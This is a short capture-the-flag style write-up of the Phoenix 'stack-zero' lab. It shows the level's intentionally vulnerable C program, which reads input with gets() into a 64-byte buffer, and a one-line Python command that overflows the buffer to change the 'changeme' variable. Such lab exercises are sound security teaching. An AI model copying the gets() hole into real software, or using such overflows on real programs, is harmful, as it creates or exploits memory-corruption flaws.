description: "The code uses **gets** function which can take input more than buffer length, hence the exploit :)
This level only asks to change the value of **changeme** to any value other than zero so we can just enter any random input that exceeds the buffer length to overwrite the value of **changeme**."

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

The code uses **gets** function which can take input more than buffer length, hence the exploit :)

This level only asks to change the value of **changeme** to any value other than zero so we can just enter any random input that exceeds the buffer length to overwrite the value of **changeme**.

# Solution:

```
$ python -c "print 'A'*100" | /opt/phoenix/amd64/stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```
